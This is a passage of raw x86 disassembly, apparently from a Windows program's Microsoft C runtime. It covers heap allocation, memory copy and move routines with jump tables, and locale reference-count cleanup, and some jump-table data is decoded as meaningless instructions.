  425fc5:	call   0x42538b
  425fca:	ret    
  425fcb:	push   0xc
  425fcd:	push   0x429688
  425fd2:	call   0x425350
  425fd7:	mov    esi,DWORD PTR [ebp+0x8]
  425fda:	cmp    DWORD PTR ds:0x45e144,0x3
  425fe1:	jne    0x426011
  425fe3:	cmp    esi,DWORD PTR ds:0x45df04
  425fe9:	ja     0x426011
  425feb:	push   0x4
  425fed:	call   0x42550f
  425ff2:	pop    ecx
  425ff3:	and    DWORD PTR [ebp-0x4],0x0
  425ff7:	push   esi
  425ff8:	call   0x426f11
  425ffd:	pop    ecx
  425ffe:	mov    DWORD PTR [ebp-0x1c],eax
  426001:	or     DWORD PTR [ebp-0x4],0xffffffff
  426005:	call   0x42603d
  42600a:	mov    eax,DWORD PTR [ebp-0x1c]
  42600d:	test   eax,eax
  42600f:	jne    0x426034
  426011:	test   esi,esi
  426013:	jne    0x426016
  426015:	inc    esi
  426016:	cmp    DWORD PTR ds:0x45e144,0x1
  42601d:	je     0x426025
  42601f:	add    esi,0xf
  426022:	and    esi,0xfffffff0
  426025:	push   esi
  426026:	push   0x0
  426028:	push   DWORD PTR ds:0x45e140
  42602e:	call   DWORD PTR ds:0x429030
  426034:	call   0x42538b
  426039:	ret    
  42603a:	mov    esi,DWORD PTR [ebp+0x8]
  42603d:	push   0x4
  42603f:	call   0x42547b
  426044:	pop    ecx
  426045:	ret    
  426046:	cmp    DWORD PTR [esp+0x4],0xffffffe0
  42604b:	ja     0x42606f
  42604d:	push   DWORD PTR [esp+0x4]
  426051:	call   0x425fcb
  426056:	test   eax,eax
  426058:	pop    ecx
  426059:	jne    0x426071
  42605b:	cmp    DWORD PTR [esp+0x8],eax
  42605f:	je     0x426071
  426061:	push   DWORD PTR [esp+0x4]
  426065:	call   0x427c32
  42606a:	test   eax,eax
  42606c:	pop    ecx
  42606d:	jne    0x42604d
  42606f:	xor    eax,eax
  426071:	ret    
  426072:	push   DWORD PTR ds:0x45ddc8
  426078:	push   DWORD PTR [esp+0x8]
  42607c:	call   0x426046
  426081:	pop    ecx
  426082:	pop    ecx
  426083:	ret    
  426084:	int3   
  426085:	int3   
  426086:	int3   
  426087:	int3   
  426088:	int3   
  426089:	int3   
  42608a:	int3   
  42608b:	int3   
  42608c:	int3   
  42608d:	int3   
  42608e:	int3   
  42608f:	int3   
  426090:	push   ebp
  426091:	mov    ebp,esp
  426093:	push   edi
  426094:	push   esi
  426095:	mov    esi,DWORD PTR [ebp+0xc]
  426098:	mov    ecx,DWORD PTR [ebp+0x10]
  42609b:	mov    edi,DWORD PTR [ebp+0x8]
  42609e:	mov    eax,ecx
  4260a0:	mov    edx,ecx
  4260a2:	add    eax,esi
  4260a4:	cmp    edi,esi
  4260a6:	jbe    0x4260b0
  4260a8:	cmp    edi,eax
  4260aa:	jb     0x42622c
  4260b0:	test   edi,0x3
  4260b6:	jne    0x4260cc
  4260b8:	shr    ecx,0x2
  4260bb:	and    edx,0x3
  4260be:	cmp    ecx,0x8
  4260c1:	jb     0x4260ec
  4260c3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4260c5:	jmp    DWORD PTR [edx*4+0x4261dc]
  4260cc:	mov    eax,edi
  4260ce:	mov    edx,0x3
  4260d3:	sub    ecx,0x4
  4260d6:	jb     0x4260e4
  4260d8:	and    eax,0x3
  4260db:	add    ecx,eax
  4260dd:	jmp    DWORD PTR [eax*4+0x4260f0]
  4260e4:	jmp    DWORD PTR [ecx*4+0x4261ec]
  4260eb:	nop
  4260ec:	jmp    DWORD PTR [ecx*4+0x426170]
  4260f3:	nop
  4260f4:	add    BYTE PTR [ecx+0x42],ah
  4260f7:	add    BYTE PTR [ecx+eiz*2],ch
  4260fa:	inc    edx
  4260fb:	add    BYTE PTR [eax+0x61],dl
  4260fe:	inc    edx
  4260ff:	add    BYTE PTR [ebx],ah
  426101:	ror    DWORD PTR [edx-0x75f877fa],1
  426107:	inc    esi
  426108:	add    DWORD PTR [eax+0x468a0147],ecx
  42610e:	add    al,cl
  426110:	jmp    0x289e917
  426115:	add    esi,0x3
  426118:	add    edi,0x3
  42611b:	cmp    ecx,0x8
  42611e:	jb     0x4260ec
  426120:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426122:	jmp    DWORD PTR [edx*4+0x4261dc]
  426129:	lea    ecx,[ecx+0x0]
  42612c:	and    edx,ecx
  42612e:	mov    al,BYTE PTR [esi]
  426130:	mov    BYTE PTR [edi],al
  426132:	mov    al,BYTE PTR [esi+0x1]
  426135:	shr    ecx,0x2
  426138:	mov    BYTE PTR [edi+0x1],al
  42613b:	add    esi,0x2
  42613e:	add    edi,0x2
  426141:	cmp    ecx,0x8
  426144:	jb     0x4260ec
  426146:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426148:	jmp    DWORD PTR [edx*4+0x4261dc]
  42614f:	nop
  426150:	and    edx,ecx
  426152:	mov    al,BYTE PTR [esi]
  426154:	mov    BYTE PTR [edi],al
  426156:	add    esi,0x1
  426159:	shr    ecx,0x2
  42615c:	add    edi,0x1
  42615f:	cmp    ecx,0x8
  426162:	jb     0x4260ec
  426164:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426166:	jmp    DWORD PTR [edx*4+0x4261dc]
  42616d:	lea    ecx,[ecx+0x0]
  426170:	shl    DWORD PTR [ecx+0x42],cl
  426173:	add    al,al
  426175:	popa   
  426176:	inc    edx
  426177:	add    BYTE PTR [eax-0x4fffbd9f],bh
  42617d:	popa   
  42617e:	inc    edx
  42617f:	add    BYTE PTR [eax-0x5fffbd9f],ch
  426185:	popa   
  426186:	inc    edx
  426187:	add    BYTE PTR [eax-0x6fffbd9f],bl
  42618d:	popa   
  42618e:	inc    edx
  42618f:	add    BYTE PTR [ebx-0x761b71bc],cl
  426195:	inc    esp
  426196:	(bad)  
  426197:	in     al,0x8b
  426199:	inc    esp
  42619a:	mov    gs,eax
  42619c:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  4261a0:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  4261a4:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  4261a8:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  4261ac:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  4261b0:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  4261b4:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  4261b8:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  4261bc:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  4261c0:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  4261c4:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  4261c8:	lea    eax,[ecx*4+0x0]
  4261cf:	add    esi,eax
  4261d1:	add    edi,eax
  4261d3:	jmp    DWORD PTR [edx*4+0x4261dc]
  4261da:	mov    edi,edi
  4261dc:	in     al,dx
  4261dd:	popa   
  4261de:	inc    edx
  4261df:	add    ah,dh
  4261e1:	popa   
  4261e2:	inc    edx
  4261e3:	add    BYTE PTR [eax],al
  4261e5:	bound  eax,QWORD PTR [edx+0x0]
  4261e8:	adc    al,0x62
  4261ea:	inc    edx
  4261eb:	add    BYTE PTR [ebx+0x5f5e0845],cl
  4261f1:	leave  
  4261f2:	ret    
  4261f3:	nop
  4261f4:	mov    al,BYTE PTR [esi]
  4261f6:	mov    BYTE PTR [edi],al
  4261f8:	mov    eax,DWORD PTR [ebp+0x8]
  4261fb:	pop    esi
  4261fc:	pop    edi
  4261fd:	leave  
  4261fe:	ret    
  4261ff:	nop
  426200:	mov    al,BYTE PTR [esi]
  426202:	mov    BYTE PTR [edi],al
  426204:	mov    al,BYTE PTR [esi+0x1]
  426207:	mov    BYTE PTR [edi+0x1],al
  42620a:	mov    eax,DWORD PTR [ebp+0x8]
  42620d:	pop    esi
  42620e:	pop    edi
  42620f:	leave  
  426210:	ret    
  426211:	lea    ecx,[ecx+0x0]
  426214:	mov    al,BYTE PTR [esi]
  426216:	mov    BYTE PTR [edi],al
  426218:	mov    al,BYTE PTR [esi+0x1]
  42621b:	mov    BYTE PTR [edi+0x1],al
  42621e:	mov    al,BYTE PTR [esi+0x2]
  426221:	mov    BYTE PTR [edi+0x2],al
  426224:	mov    eax,DWORD PTR [ebp+0x8]
  426227:	pop    esi
  426228:	pop    edi
  426229:	leave  
  42622a:	ret    
  42622b:	nop
  42622c:	lea    esi,[ecx+esi*1-0x4]
  426230:	lea    edi,[ecx+edi*1-0x4]
  426234:	test   edi,0x3
  42623a:	jne    0x426260
  42623c:	shr    ecx,0x2
  42623f:	and    edx,0x3
  426242:	cmp    ecx,0x8
  426245:	jb     0x426254
  426247:	std    
  426248:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42624a:	cld    
  42624b:	jmp    DWORD PTR [edx*4+0x426378]
  426252:	mov    edi,edi
  426254:	neg    ecx
  426256:	jmp    DWORD PTR [ecx*4+0x426328]
  42625d:	lea    ecx,[ecx+0x0]
  426260:	mov    eax,edi
  426262:	mov    edx,0x3
  426267:	cmp    ecx,0x4
  42626a:	jb     0x426278
  42626c:	and    eax,0x3
  42626f:	sub    ecx,eax
  426271:	jmp    DWORD PTR [eax*4+0x42627c]
  426278:	jmp    DWORD PTR [ecx*4+0x426378]
  42627f:	nop
  426280:	mov    WORD PTR [edx+0x42],fs
  426283:	add    BYTE PTR [eax-0x27ffbd9e],dh
  426289:	bound  eax,QWORD PTR [edx+0x0]
  42628c:	mov    al,BYTE PTR [esi+0x3]
  42628f:	and    edx,ecx
  426291:	mov    BYTE PTR [edi+0x3],al
  426294:	sub    esi,0x1
  426297:	shr    ecx,0x2
  42629a:	sub    edi,0x1
  42629d:	cmp    ecx,0x8
  4262a0:	jb     0x426254
  4262a2:	std    
  4262a3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4262a5:	cld    
  4262a6:	jmp    DWORD PTR [edx*4+0x426378]
  4262ad:	lea    ecx,[ecx+0x0]
  4262b0:	mov    al,BYTE PTR [esi+0x3]
  4262b3:	and    edx,ecx
  4262b5:	mov    BYTE PTR [edi+0x3],al
  4262b8:	mov    al,BYTE PTR [esi+0x2]
  4262bb:	shr    ecx,0x2
  4262be:	mov    BYTE PTR [edi+0x2],al
  4262c1:	sub    esi,0x2
  4262c4:	sub    edi,0x2
  4262c7:	cmp    ecx,0x8
  4262ca:	jb     0x426254
  4262cc:	std    
  4262cd:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4262cf:	cld    
  4262d0:	jmp    DWORD PTR [edx*4+0x426378]
  4262d7:	nop
  4262d8:	mov    al,BYTE PTR [esi+0x3]
  4262db:	and    edx,ecx
  4262dd:	mov    BYTE PTR [edi+0x3],al
  4262e0:	mov    al,BYTE PTR [esi+0x2]
  4262e3:	mov    BYTE PTR [edi+0x2],al
  4262e6:	mov    al,BYTE PTR [esi+0x1]
  4262e9:	shr    ecx,0x2
  4262ec:	mov    BYTE PTR [edi+0x1],al
  4262ef:	sub    esi,0x3
  4262f2:	sub    edi,0x3
  4262f5:	cmp    ecx,0x8
  4262f8:	jb     0x426254
  4262fe:	std    
  4262ff:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426301:	cld    
  426302:	jmp    DWORD PTR [edx*4+0x426378]
  426309:	lea    ecx,[ecx+0x0]
  42630c:	sub    al,0x63
  42630e:	inc    edx
  42630f:	add    BYTE PTR [ebx+eiz*2],dh
  426312:	inc    edx
  426313:	add    BYTE PTR [ebx+eiz*2],bh
  426316:	inc    edx
  426317:	add    BYTE PTR [ebx+eiz*2+0x42],al
  42631b:	add    BYTE PTR [ebx+eiz*2+0x42],cl
  42631f:	add    BYTE PTR [ebx+eiz*2+0x42],dl
  426323:	add    BYTE PTR [ebx+eiz*2+0x42],bl
  426327:	add    BYTE PTR [edi+0x63],ch
  42632a:	inc    edx
  42632b:	add    BYTE PTR [ebx-0x76e371bc],cl
  426331:	inc    esp
  426332:	(bad)  
  426333:	sbb    al,0x8b
  426335:	inc    esp
  426336:	mov    ds,WORD PTR [eax]
  426338:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42633c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  426340:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  426344:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  426348:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  42634c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  426350:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  426354:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  426358:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  42635c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  426360:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  426364:	lea    eax,[ecx*4+0x0]
  42636b:	add    esi,eax
  42636d:	add    edi,eax
  42636f:	jmp    DWORD PTR [edx*4+0x426378]
  426376:	mov    edi,edi
  426378:	mov    BYTE PTR [ebx+0x42],ah
  42637b:	add    BYTE PTR [eax-0x5fffbd9d],dl
  426381:	arpl   WORD PTR [edx+0x0],ax
  426384:	mov    ah,0x63
  426386:	inc    edx
  426387:	add    BYTE PTR [ebx+0x5f5e0845],cl
  42638d:	leave  
  42638e:	ret    
  42638f:	nop
  426390:	mov    al,BYTE PTR [esi+0x3]
  426393:	mov    BYTE PTR [edi+0x3],al
  426396:	mov    eax,DWORD PTR [ebp+0x8]
  426399:	pop    esi
  42639a:	pop    edi
  42639b:	leave  
  42639c:	ret    
  42639d:	lea    ecx,[ecx+0x0]
  4263a0:	mov    al,BYTE PTR [esi+0x3]
  4263a3:	mov    BYTE PTR [edi+0x3],al
  4263a6:	mov    al,BYTE PTR [esi+0x2]
  4263a9:	mov    BYTE PTR [edi+0x2],al
  4263ac:	mov    eax,DWORD PTR [ebp+0x8]
  4263af:	pop    esi
  4263b0:	pop    edi
  4263b1:	leave  
  4263b2:	ret    
  4263b3:	nop
  4263b4:	mov    al,BYTE PTR [esi+0x3]
  4263b7:	mov    BYTE PTR [edi+0x3],al
  4263ba:	mov    al,BYTE PTR [esi+0x2]
  4263bd:	mov    BYTE PTR [edi+0x2],al
  4263c0:	mov    al,BYTE PTR [esi+0x1]
  4263c3:	mov    BYTE PTR [edi+0x1],al
  4263c6:	mov    eax,DWORD PTR [ebp+0x8]
  4263c9:	pop    esi
  4263ca:	pop    edi
  4263cb:	leave  
  4263cc:	ret    
  4263cd:	push   DWORD PTR [esp+0x4]
  4263d1:	call   DWORD PTR ds:0x4290cc
  4263d7:	xor    eax,eax
  4263d9:	inc    eax
  4263da:	ret    0x8
  4263dd:	push   0x10
  4263df:	push   0x4296d0
  4263e4:	call   0x425350
  4263e9:	mov    eax,ds:0x45dd88
  4263ee:	test   eax,eax
  4263f0:	jne    0x426429
  4263f2:	cmp    DWORD PTR ds:0x45dac4,0x1
  4263f9:	je     0x42641f
  4263fb:	push   0x4296bc
  426400:	call   DWORD PTR ds:0x429024
  426406:	test   eax,eax
  426408:	je     0x42641f
  42640a:	push   0x429694
  42640f:	push   eax
  426410:	call   DWORD PTR ds:0x429020
  426416:	mov    ds:0x45dd88,eax
  42641b:	test   eax,eax
  42641d:	jne    0x426429
  42641f:	mov    eax,0x4263cd
  426424:	mov    ds:0x45dd88,eax
  426429:	and    DWORD PTR [ebp-0x4],0x0
  42642d:	push   DWORD PTR [ebp+0xc]
  426430:	push   DWORD PTR [ebp+0x8]
  426433:	call   eax
  426435:	mov    DWORD PTR [ebp-0x1c],eax
  426438:	jmp    0x42645e
  42643a:	mov    eax,DWORD PTR [ebp-0x14]
  42643d:	mov    eax,DWORD PTR [eax]
  42643f:	mov    eax,DWORD PTR [eax]
  426441:	mov    DWORD PTR [ebp-0x20],eax
  426444:	xor    eax,eax
  426446:	inc    eax
  426447:	ret    
  426448:	mov    esp,DWORD PTR [ebp-0x18]
  42644b:	cmp    DWORD PTR [ebp-0x20],0xc0000017
  426452:	jne    0x42645c
  426454:	push   0x8
  426456:	call   DWORD PTR ds:0x429098
  42645c:	xor    eax,eax
  42645e:	or     DWORD PTR [ebp-0x4],0xffffffff
  426462:	call   0x42538b
  426467:	ret    
  426468:	push   0x10
  42646a:	push   0x4296e0
  42646f:	call   0x425350
  426474:	mov    esi,DWORD PTR [ebp+0x8]
  426477:	imul   esi,DWORD PTR [ebp+0xc]
  42647b:	mov    DWORD PTR [ebp-0x1c],esi
  42647e:	test   esi,esi
  426480:	jne    0x426483
  426482:	inc    esi
  426483:	xor    edi,edi
  426485:	mov    DWORD PTR [ebp-0x20],edi
  426488:	cmp    esi,0xffffffe0
  42648b:	ja     0x4264f2
  42648d:	cmp    DWORD PTR ds:0x45e144,0x3
  426494:	jne    0x4264dd
  426496:	add    esi,0xf
  426499:	and    esi,0xfffffff0
  42649c:	mov    DWORD PTR [ebp+0xc],esi
  42649f:	mov    ebx,DWORD PTR [ebp-0x1c]
  4264a2:	cmp    ebx,DWORD PTR ds:0x45df04
  4264a8:	ja     0x4264dd
  4264aa:	push   0x4
  4264ac:	call   0x42550f
  4264b1:	pop    ecx
  4264b2:	and    DWORD PTR [ebp-0x4],edi
  4264b5:	push   ebx
  4264b6:	call   0x426f11
  4264bb:	pop    ecx
  4264bc:	mov    DWORD PTR [ebp-0x20],eax
  4264bf:	or     DWORD PTR [ebp-0x4],0xffffffff
  4264c3:	call   0x426512
  4264c8:	mov    edi,DWORD PTR [ebp-0x20]
  4264cb:	test   edi,edi
  4264cd:	je     0x4264e1
  4264cf:	push   DWORD PTR [ebp-0x1c]
  4264d2:	push   0x0
  4264d4:	push   edi
  4264d5:	call   0x427c50
  4264da:	add    esp,0xc
  4264dd:	test   edi,edi
  4264df:	jne    0x42651b
  4264e1:	push   esi
  4264e2:	push   0x8
  4264e4:	push   DWORD PTR ds:0x45e140
  4264ea:	call   DWORD PTR ds:0x429030
  4264f0:	mov    edi,eax
  4264f2:	test   edi,edi
  4264f4:	jne    0x42651b
  4264f6:	cmp    DWORD PTR ds:0x45ddc8,edi
  4264fc:	je     0x42651b
  4264fe:	push   esi
  4264ff:	call   0x427c32
  426504:	pop    ecx
  426505:	test   eax,eax
  426507:	jne    0x426483
  42650d:	jmp    0x42651d
  42650f:	mov    esi,DWORD PTR [ebp+0xc]
  426512:	push   0x4
  426514:	call   0x42547b
  426519:	pop    ecx
  42651a:	ret    
  42651b:	mov    eax,edi
  42651d:	call   0x42538b
  426522:	ret    
  426523:	push   esi
  426524:	mov    esi,DWORD PTR [esp+0x8]
  426528:	mov    eax,DWORD PTR [esi+0x3c]
  42652b:	push   edi
  42652c:	xor    edi,edi
  42652e:	cmp    eax,DWORD PTR ds:0x45ddd4
  426534:	je     0x426599
  426536:	cmp    eax,edi
  426538:	je     0x426599
  42653a:	mov    eax,DWORD PTR [esi+0x2c]
  42653d:	cmp    DWORD PTR [eax],edi
  42653f:	jne    0x426599
  426541:	mov    eax,DWORD PTR [esi+0x34]
  426544:	cmp    eax,edi
  426546:	je     0x426564
  426548:	cmp    DWORD PTR [eax],edi
  42654a:	jne    0x426564
  42654c:	cmp    eax,DWORD PTR ds:0x45def0
  426552:	je     0x426564
  426554:	push   eax
  426555:	call   0x425f5a
  42655a:	push   DWORD PTR [esi+0x3c]
  42655d:	call   0x427e9f
  426562:	pop    ecx
  426563:	pop    ecx
  426564:	mov    eax,DWORD PTR [esi+0x30]
  426567:	cmp    eax,edi
  426569:	je     0x426587
  42656b:	cmp    DWORD PTR [eax],edi
  42656d:	jne    0x426587
  42656f:	cmp    eax,DWORD PTR ds:0x45def4
  426575:	je     0x426587
  426577:	push   eax
  426578:	call   0x425f5a
  42657d:	push   DWORD PTR [esi+0x3c]
  426580:	call   0x427e40
  426585:	pop    ecx
  426586:	pop    ecx
  426587:	push   DWORD PTR [esi+0x2c]
  42658a:	call   0x425f5a
  42658f:	push   DWORD PTR [esi+0x3c]
  426592:	call   0x425f5a
  426597:	pop    ecx
  426598:	pop    ecx
  426599:	mov    eax,DWORD PTR [esi+0x40]
  42659c:	cmp    eax,DWORD PTR ds:0x45deec
  4265a2:	je     0x4265bc
  4265a4:	cmp    eax,edi
  4265a6:	je     0x4265bc
  4265a8:	cmp    DWORD PTR [eax],edi
  4265aa:	jne    0x4265bc
  4265ac:	push   eax
  4265ad:	call   0x425f5a
  4265b2:	push   DWORD PTR [esi+0x44]
  4265b5:	call   0x425f5a
  4265ba:	pop    ecx
  4265bb:	pop    ecx
  4265bc:	mov    eax,DWORD PTR [esi+0x50]
  4265bf:	cmp    eax,DWORD PTR ds:0x45ddd0
  4265c5:	je     0x4265e3
  4265c7:	cmp    eax,edi
  4265c9:	je     0x4265e3
  4265cb:	cmp    DWORD PTR [eax+0xb4],edi
  4265d1:	jne    0x4265e3
  4265d3:	push   eax
  4265d4:	call   0x427cb0
  4265d9:	push   DWORD PTR [esi+0x50]
  4265dc:	call   0x425f5a
  4265e1:	pop    ecx
  4265e2:	pop    ecx
  4265e3:	push   esi
  4265e4:	call   0x425f5a
  4265e9:	pop    ecx
  4265ea:	pop    edi
  4265eb:	pop    esi
  4265ec:	ret    
  4265ed:	push   esi
  4265ee:	call   0x425203
  4265f3:	mov    esi,eax
  4265f5:	mov    eax,DWORD PTR [esi+0x64]
  4265f8:	cmp    eax,DWORD PTR ds:0x45d58c
  4265fe:	je     0x4266aa
  426604:	test   eax,eax
  426606:	je     0x426637
  426608:	mov    ecx,DWORD PTR [eax+0x2c]
  42660b:	dec    DWORD PTR [eax]
  42660d:	test   ecx,ecx
  42660f:	je     0x426613
  426611:	dec    DWORD PTR [ecx]
  426613:	mov    ecx,DWORD PTR [eax+0x34]
  426616:	test   ecx,ecx
  426618:	je     0x42661c
  42661a:	dec    DWORD PTR [ecx]
  42661c:	mov    ecx,DWORD PTR [eax+0x30]
  42661f:	test   ecx,ecx
  426621:	je     0x426625
  426623:	dec    DWORD PTR [ecx]
  426625:	mov    ecx,DWORD PTR [eax+0x40]
  426628:	test   ecx,ecx
  42662a:	je     0x42662e
  42662c:	dec    DWORD PTR [ecx]
  42662e:	mov    ecx,DWORD PTR [eax+0x4c]
  426631:	dec    DWORD PTR [ecx+0xb4]
  426637:	mov    ecx,DWORD PTR ds:0x45d58c
  42663d:	mov    DWORD PTR [esi+0x64],ecx
  426640:	mov    ecx,DWORD PTR ds:0x45d58c
  426646:	inc    DWORD PTR [ecx]
  426648:	mov    ecx,DWORD PTR ds:0x45d58c
  42664e:	mov    ecx,DWORD PTR [ecx+0x2c]
  426651:	test   ecx,ecx
  426653:	je     0x426657
  426655:	inc    DWORD PTR [ecx]
  426657:	mov    ecx,DWORD PTR ds:0x45d58c
  42665d:	mov    ecx,DWORD PTR [ecx+0x34]
  426660:	test   ecx,ecx
  426662:	je     0x426666
  426664:	inc    DWORD PTR [ecx]
  426666:	mov    ecx,DWORD PTR ds:0x45d58c
  42666c:	mov    ecx,DWORD PTR [ecx+0x30]
  42666f:	test   ecx,ecx
  426671:	je     0x426675
  426673:	inc    DWORD PTR [ecx]
  426675:	mov    ecx,DWORD PTR ds:0x45d58c
  42667b:	mov    ecx,DWORD PTR [ecx+0x40]
  42667e:	test   ecx,ecx
  426680:	je     0x426684
  426682:	inc    DWORD PTR [ecx]
  426684:	mov    ecx,DWORD PTR ds:0x45d58c
  42668a:	mov    ecx,DWORD PTR [ecx+0x4c]
  42668d:	inc    DWORD PTR [ecx+0xb4]
  426693:	test   eax,eax
  426695:	je     0x4266aa
  426697:	cmp    DWORD PTR [eax],0x0
  42669a:	jne    0x4266aa
  42669c:	cmp    eax,0x45d538
  4266a1:	je     0x4266aa
  4266a3:	push   eax
  4266a4:	call   0x426523
  4266a9:	pop    ecx
  4266aa:	mov    eax,DWORD PTR [esi+0x64]
  4266ad:	pop    esi
  4266ae:	ret    
  4266af:	push   0xc
  4266b1:	push   0x429870
  4266b6:	call   0x425350
  4266bb:	push   0xc
  4266bd:	call   0x42550f
  4266c2:	pop    ecx
  4266c3:	and    DWORD PTR [ebp-0x4],0x0
  4266c7:	call   0x4265ed
  4266cc:	mov    DWORD PTR [ebp-0x1c],eax
  4266cf:	or     DWORD PTR [ebp-0x4],0xffffffff
  4266d3:	call   0x4266e1
  4266d8:	mov    eax,DWORD PTR [ebp-0x1c]
  4266db:	call   0x42538b
  4266e0:	ret    
  4266e1:	push   0xc
  4266e3:	call   0x42547b
  4266e8:	pop    ecx
  4266e9:	ret    
  4266ea:	push   0x140
  4266ef:	push   0x0
  4266f1:	push   DWORD PTR ds:0x45e140
  4266f7:	call   DWORD PTR ds:0x429030
  4266fd:	test   eax,eax
  4266ff:	mov    ds:0x45df00,eax
  426704:	jne    0x426707
  426706:	ret    
  426707:	mov    ecx,DWORD PTR [esp+0x4]
  42670b:	and    DWORD PTR ds:0x45def8,0x0
  426712:	and    DWORD PTR ds:0x45defc,0x0
  426719:	mov    ds:0x45df08,eax
  42671e:	xor    eax,eax
  426720:	mov    DWORD PTR ds:0x45df04,ecx
  426726:	mov    DWORD PTR ds:0x45df0c,0x10
  426730:	inc    eax
  426731:	ret    
  426732:	mov    eax,ds:0x45defc
  426737:	lea    ecx,[eax+eax*4]
  42673a:	mov    eax,ds:0x45df00
  42673f:	lea    ecx,[eax+ecx*4]
  426742:	jmp    0x426756
  426744:	mov    edx,DWORD PTR [esp+0x4]
  426748:	sub    edx,DWORD PTR [eax+0xc]
  42674b:	cmp    edx,0x100000
  426751:	jb     0x42675c
  426753:	add    eax,0x14
  426756:	cmp    eax,ecx
  426758:	jb     0x426744
  42675a:	xor    eax,eax
  42675c:	ret    
  42675d:	push   ebp
  42675e:	mov    ebp,esp
  426760:	sub    esp,0x10
  426763:	mov    ecx,DWORD PTR [ebp+0x8]
  426766:	mov    eax,DWORD PTR [ecx+0x10]
  426769:	push   esi
  42676a:	mov    esi,DWORD PTR [ebp+0xc]
  42676d:	push   edi
  42676e:	mov    edi,esi
  426770:	sub    edi,DWORD PTR [ecx+0xc]
  426773:	add    esi,0xfffffffc
  426776:	shr    edi,0xf
  426779:	mov    ecx,edi
  42677b:	imul   ecx,ecx,0x204
  426781:	lea    ecx,[ecx+eax*1+0x144]
  426788:	mov    DWORD PTR [ebp-0x10],ecx
  42678b:	mov    ecx,DWORD PTR [esi]
  42678d:	dec    ecx
  42678e:	test   cl,0x1
  426791:	mov    DWORD PTR [ebp-0x4],ecx
  426794:	jne    0x426a71
  42679a:	push   ebx
  42679b:	lea    ebx,[ecx+esi*1]
  42679e:	mov    edx,DWORD PTR [ebx]
  4267a0:	mov    DWORD PTR [ebp-0xc],edx
  4267a3:	mov    edx,DWORD PTR [esi-0x4]
  4267a6:	mov    DWORD PTR [ebp-0x8],edx
  4267a9:	mov    edx,DWORD PTR [ebp-0xc]
  4267ac:	test   dl,0x1
  4267af:	mov    DWORD PTR [ebp+0xc],ebx
  4267b2:	jne    0x426828
  4267b4:	sar    edx,0x4
  4267b7:	dec    edx
  4267b8:	cmp    edx,0x3f
  4267bb:	jbe    0x4267c0
  4267bd:	push   0x3f
  4267bf:	pop    edx
  4267c0:	mov    ecx,DWORD PTR [ebx+0x4]
  4267c3:	cmp    ecx,DWORD PTR [ebx+0x8]
  4267c6:	jne    0x42680a
  4267c8:	cmp    edx,0x20
  4267cb:	mov    ebx,0x80000000
  4267d0:	jae    0x4267eb
  4267d2:	mov    ecx,edx
  4267d4:	shr    ebx,cl
  4267d6:	lea    ecx,[edx+eax*1+0x4]
  4267da:	not    ebx
  4267dc:	and    DWORD PTR [eax+edi*4+0x44],ebx
  4267e0:	dec    BYTE PTR [ecx]
  4267e2:	jne    0x426807
  4267e4:	mov    ecx,DWORD PTR [ebp+0x8]
  4267e7:	and    DWORD PTR [ecx],ebx
  4267e9:	jmp    0x426807
  4267eb:	lea    ecx,[edx-0x20]
  4267ee:	shr    ebx,cl
  4267f0:	lea    ecx,[edx+eax*1+0x4]
  4267f4:	not    ebx
  4267f6:	and    DWORD PTR [eax+edi*4+0xc4],ebx
  4267fd:	dec    BYTE PTR [ecx]
  4267ff:	jne    0x426807
  426801:	mov    ecx,DWORD PTR [ebp+0x8]
  426804:	and    DWORD PTR [ecx+0x4],ebx
  426807:	mov    ebx,DWORD PTR [ebp+0xc]
  42680a:	mov    edx,DWORD PTR [ebx+0x8]
  42680d:	mov    ebx,DWORD PTR [ebx+0x4]
  426810:	mov    ecx,DWORD PTR [ebp-0x4]
  426813:	add    ecx,DWORD PTR [ebp-0xc]
  426816:	mov    DWORD PTR [edx+0x4],ebx
  426819:	mov    edx,DWORD PTR [ebp+0xc]
  42681c:	mov    ebx,DWORD PTR [edx+0x4]
  42681f:	mov    edx,DWORD PTR [edx+0x8]
  426822:	mov    DWORD PTR [ebx+0x8],edx
  426825:	mov    DWORD PTR [ebp-0x4],ecx
  426828:	mov    edx,ecx
  42682a:	sar    edx,0x4
  42682d:	dec    edx
  42682e:	cmp    edx,0x3f
  426831:	jbe    0x426836
  426833:	push   0x3f
  426835:	pop    edx
  426836:	mov    ebx,DWORD PTR [ebp-0x8]
  426839:	and    ebx,0x1
  42683c:	mov    DWORD PTR [ebp-0xc],ebx
  42683f:	jne    0x4268d4
  426845:	sub    esi,DWORD PTR [ebp-0x8]
  426848:	mov    ebx,DWORD PTR [ebp-0x8]
  42684b:	sar    ebx,0x4
  42684e:	push   0x3f
  426850:	mov    DWORD PTR [ebp+0xc],esi
  426853:	dec    ebx
  426854:	pop    esi
  426855:	cmp    ebx,esi
  426857:	jbe    0x42685b
  426859:	mov    ebx,esi
  42685b:	add    ecx,DWORD PTR [ebp-0x8]
  42685e:	mov    edx,ecx
  426860:	sar    edx,0x4
  426863:	dec    edx
